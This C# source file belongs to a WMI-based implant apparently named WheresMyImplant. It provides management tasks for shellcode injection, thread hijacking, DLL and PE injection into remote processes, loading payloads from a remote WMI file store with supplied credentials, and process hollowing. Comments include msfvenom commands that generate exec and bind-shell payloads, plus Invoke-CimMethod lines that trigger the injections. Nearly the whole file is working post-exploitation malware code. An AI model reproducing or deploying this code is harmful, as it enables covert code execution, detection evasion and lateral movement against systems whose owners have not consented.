using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
        public static string InjectShellCode(String strProcessId, String shellCodeString)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(strProcessId))
            {
                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                    return injectShellCode.GetOutput();
                }
            }
            else if (Int32.TryParse(strProcessId, out dwProcessId))
            {
                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    using (Tokens tokens = new Tokens())
                    {
                        injectShellCodeRemote.Execute();
                        return injectShellCodeRemote.GetOutput();
                    }
                }
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        public static string InjectShellCodeWMIFSB64(String processId, String wmiClass, String fileName)
        {

            Byte[] peBytes = Misc.QueryWMIFS(wmiClass, fileName);
            String shellCodeString = System.Text.Encoding.Unicode.GetString(peBytes);

            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(processId))
            {
                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
                {
                    injectShellCode.Execute();
                    return injectShellCode.GetOutput();
                }
            }
            else if (Int32.TryParse(processId, out dwProcessId))
            {
                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
                {
                    using (Tokens tokens = new Tokens())
                    {
                        injectShellCodeRemote.Execute();
                        return injectShellCodeRemote.GetOutput();
                    }
                }
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        public static string HijackThread(String strProcessId, Byte[] buffer)
        {
            StringBuilder output = new StringBuilder();

            if (!Int32.TryParse(strProcessId, out Int32 dwProcessId))
            {
                return "Invalid Process ID: " + strProcessId;
            }

            using (HijackThread ht = new HijackThread((UInt32)dwProcessId, buffer))
            {
                try
                {
                    ht.Execute();
                }
                catch (Exception ex)
                {
                    output.Append(ex.ToString());
                }
                finally
                {
                    output.Append(ht.GetOutput());
                }
            }
            return output.ToString();
        }

        // Todo: Add Auto Token Privilege Elevation
        [ManagementTask]
        //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
        public static String LoadDll(String processId, String library)
        {
            Int32 dwProcessId = 0;
            if (String.IsNullOrEmpty(processId))
            {
                LoadDll injectDll = new LoadDll(library);
                return injectDll.GetOutput();
            }
            else if (Int32.TryParse(processId, out dwProcessId))
            {
                String output;
                using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                {
                    using (Tokens tokens = new Tokens())
                    {
                        injectDllRemote.Execute();
                        output = injectDllRemote.GetOutput();
                    }
                }
                return output;
            }
            else
            {
                return "Invalid Process ID";
            }
        }

        [ManagementTask]
        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectPE -Arguments @{processId="5648"; fileName="C:\bind64.exe"; parameters=""}
        public static string InjectPE(String processId, String fileName, String parameters)
        {
            PELoader peLoader = new PELoader();
            if (!peLoader.Execute(fileName))
            {
                return "PELoader Failed";
            }
            return _InjectPE(processId, peLoader, parameters);
        }

        [ManagementTask]
        public static String InjectPEString(String processId, String peString, String parameters)
        {
            PELoader peLoader = new PELoader();
            if (!peLoader.Execute(System.Convert.FromBase64String(peString)))
            {
                return "PELoader Failed";
            }
            return _InjectPE(processId, peLoader, parameters);
        }

        [ManagementTask]
        public static string InjectPEWMIFS(String processId, String wmiClass, String fileName, String parameters)
        {
            PELoader peLoader = new PELoader();
            if (!peLoader.Execute(Misc.QueryWMIFS(wmiClass, fileName)))
            {
                return "PELoader Failed";
            }
            return _InjectPE(processId, peLoader, parameters);
        }

        [ManagementTask]
        public static string InjectPEWMIFSRemote(String processId, String wmiClass, String system, String username, String password, String fileName, String parameters)
        {
            ConnectionOptions options = new ConnectionOptions();
            options.Username = username;
            options.Password = password;

            ManagementScope scope = new ManagementScope("\\\\" + system + "\\root\\cimv2", options);
            scope.Connect();

            ObjectQuery queryIndexCount = new ObjectQuery("SELECT Index FROM WMIFS WHERE FileName = \'" + fileName + "\'");
            ManagementObjectSearcher searcherIndexCount = new ManagementObjectSearcher(scope, queryIndexCount);
            ManagementObjectCollection queryIndexCollection = searcherIndexCount.Get();
            int indexCount = queryIndexCollection.Count;

            String EncodedText = "";
            for (int i = 0; i < indexCount; i++)
            {
                ObjectQuery queryFilePart = new ObjectQuery("SELECT FileStore FROM WMIFS WHERE FileName = \'" + fileName + "\' AND Index = \'" + i + "\'");
                ManagementObjectSearcher searcherFilePart = new ManagementObjectSearcher(scope, queryFilePart);
                ManagementObjectCollection queryCollection = searcherFilePart.Get();
                foreach (ManagementObject filePart in queryCollection)
                {
                    EncodedText += filePart["FileStore"].ToString();
                }
            }

            Byte[] peBytes = System.Convert.FromBase64String(EncodedText);
            PELoader peLoader = new PELoader();
            if (!peLoader.Execute(peBytes))
            {
                return "PELoader Failed";
            }
            return _InjectPE(processId, peLoader, parameters);
        }

        [ManagementTask]
        private static String _InjectPE(String processId, PELoader peLoader, String parameters)
        {
            StringBuilder output = new StringBuilder();
            output.Append(peLoader.GetOutput());
            output.Append("\n");

            Int32 dwProcessId;
            try
            {
                if (!Int32.TryParse(processId, out dwProcessId))
                {
                    InjectPE injectPE = new InjectPE(peLoader, parameters);
                    output.Append(injectPE.GetOutput());
                }
                else
                {
                    InjectPERemote injectPE = injectPE = new InjectPERemote((UInt32)dwProcessId, peLoader, parameters);
                    try
                    {
                        using (Tokens tokens = new Tokens())
                        {
                            injectPE.Execute();
                        }
                    }
                    catch (Exception error)
                    {
                        output.Append(error.ToString());
                        output.Append("[-] Execution Failed\n");
                    }
                    finally
                    {
                        output.Append(injectPE.GetOutput());
                    }
                }
            }
            catch (FormatException ex)
            {
                output.Append("[-] Unable to Parse Process ID");
                output.Append(String.Format("[-] {0}", ex.Message));
                InjectPE injectPE = new InjectPE(peLoader, parameters);
                output.Append(injectPE.GetOutput());
            }
            catch (Exception ex)
            {
                output.Append("[-] Unhandled Exception Occured");
                output.Append(ex.Message);
            }
            return output.ToString();
        }

        [ManagementTask]
        public static String HollowProcess(String target, String replacement, String wait)
        {
            Boolean bWait;
            if (!Boolean.TryParse(wait, out bWait))
            {
                return "Unable to parse wait parameter (true, false)";
            }

            HollowProcess hp = new HollowProcess();
            if (!hp.ReadSourceImageFile(replacement))
            {
                return hp.GetOutput();
            }

            if (!hp.CreateSuspendedProcess(target))
            {
                return hp.GetOutput();
            }

            if (!hp.RemapImage())
            {
                return hp.GetOutput();
            }

            if (!hp.ResumeProcess(bWait))
            {
                return hp.GetOutput();
            }

            return hp.GetOutput() + "\nProcess Hollowed";
        }

        [ManagementTask]
        public static String HollowProcessString(String target, String replacement, String wait)
        {
            Boolean bWait;
            if (!Boolean.TryParse(wait, out bWait))
            {
                return "Unable to parse wait parameter (true, false)";
            }

            StringBuilder output = new StringBuilder();
            HollowProcess hp = new HollowProcess();
            if (!hp.ReadSourceImageString(replacement))
            {
                return output.ToString();
            }

            if (!hp.CreateSuspendedProcess(target))
            {
                return output.ToString();
            }

            if (!hp.RemapImage())
            {
                return output.ToString();
            }

            if (!hp.ResumeProcess(bWait))
            {
                return output.ToString();
            }

            output.Append("Process Hollowed");
            return output.ToString();
        }
    }
}
